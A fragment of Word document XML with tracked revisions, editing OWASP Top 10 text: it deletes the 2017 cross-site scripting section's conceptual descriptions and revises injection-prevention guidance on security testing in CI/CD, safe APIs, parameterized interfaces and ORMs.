          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">dynamic </w:t>
      </w:r>
      <w:ins w:id="1172" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">(DAST), and interactive (IAST) </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">application </w:t>
      </w:r>
      <w:del w:id="1173" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>test ([DAST](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools))</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1174" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>security testing</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> tools into the CI/CD</w:t>
      </w:r>
      <w:del w:id="1175" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="10A1B9EA" w14:textId="254785ED" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1176" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">pipeline to identify </w:t>
      </w:r>
      <w:del w:id="1177" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">newly </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">introduced injection flaws </w:t>
      </w:r>
      <w:del w:id="1178" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>prior to</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1179" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>before</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> production</w:t>
      </w:r>
      <w:del w:id="1180" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2765EED8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deployment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E9A4BF" w14:textId="77777777" w:rsidR="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1181" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75621072" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1182" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1183" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A7:2017 Cross-Site Scripting (XSS)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="69AE8AC9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="1184" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1185" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## Is the Application Vulnerable</w:delText>
        </w:r>
      </w:del>
      <w:moveFromRangeStart w:id="1186" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923161"/>
      <w:moveFrom w:id="1187" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>?</w:t>
        </w:r>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="680F2652" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="1188" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EBE58E1" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1189" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="1190" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">There are three </w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="1186"/>
      <w:del w:id="1191" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>forms of XSS, usually targeting users' browsers:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="176490EC" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1192" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="081877D8" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1193" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1194" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* **Reflected XSS**: The application or API includes unvalidated and unescaped user input as part of HTML output. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2DBA3F3C" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1195" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1196" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* **Stored XSS**: The application or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Stored XSS is often considered a high or critical risk.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5D18A940" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1197" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1198" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* **DOM XSS**: JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS. Ideally, the application would not send attacker-controllable data to unsafe JavaScript APIs.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1621EEE5" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1199" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00B9152B" w14:textId="77777777" w:rsidR="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1200" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1201" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">Typical XSS attacks include session stealing, account takeover, MFA bypass, DOM node replacement or defacement (such as trojan login panels), attacks against the user's browser such as malicious software downloads, key logging, and other client-side </w:delText>
        </w:r>
      </w:del>
      <w:moveFromRangeStart w:id="1202" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923167"/>
      <w:moveFrom w:id="1203" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>attacks.</w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="1202"/>
    </w:p>
    <w:p w14:paraId="0C88AE16" w14:textId="576DCFB0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="728B3EC2" w14:textId="2AC56E34" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">## How </w:t>
      </w:r>
      <w:del w:id="1204" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>To</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1205" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>to</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F37E3A" w14:textId="77777777" w:rsidR="00B74248" w:rsidRPr="00841D1E" w:rsidRDefault="00B74248" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="323E6AB0" w14:textId="732188F8" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Preventing injection requires keeping data separate from commands and queries</w:t>
      </w:r>
      <w:del w:id="1206" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1207" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1F8F9FD5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63F36334" w14:textId="0BC810B0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1208" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1209" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1210" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The preferred option is to use a safe API, which avoids </w:t>
      </w:r>
      <w:ins w:id="1211" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">using </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>the</w:t>
      </w:r>
      <w:del w:id="1212" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> use of the</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0B319DE8" w14:textId="2C43E5CE" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1213" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1214" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> interpreter entirely</w:t>
      </w:r>
      <w:del w:id="1215" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> or</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1216" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> provides a parameterized interface, or</w:t>
      </w:r>
      <w:del w:id="1217" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> migrate</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="098382DC" w14:textId="33650745" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1218" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1219" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    migrates</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:del w:id="1220" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">use </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Object Relational Mapping Tools (ORMs</w:t>
      </w:r>
      <w:del w:id="1221" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>).</w:delText>
        </w:r>
      </w:del>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="1222" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>).&lt;</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>br</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>/&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="153FE088" w14:textId="45D4BFE0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1223" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1224" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> **Note</w:t>
      </w:r>
      <w:del w:id="1225" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1226" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:**</w:t>
        </w:r>
      </w:ins>
